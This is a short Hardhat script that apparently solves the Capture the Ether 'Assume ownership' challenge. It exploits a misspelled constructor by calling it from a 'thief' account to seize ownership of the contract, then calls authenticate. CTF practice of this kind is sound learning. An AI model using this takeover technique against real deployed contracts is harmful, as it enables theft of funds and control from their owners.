import { ethers } from "hardhat";

async function main() {
  const [, thief] = await ethers.getSigners();

  // deploy contract
  const contract = await ethers.deployContract("AssumeOwnershipChallenge");
  await contract.waitForDeployment();

  // call "constructor"
  const own = await contract.connect(thief).AssumeOwmershipChallenge();
  await own.wait();

  // authenticate
  const authenticate = await contract.connect(thief).authenticate();
  await authenticate.wait();

  const isComplete = await contract.isComplete();
  console.log(isComplete);
}
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
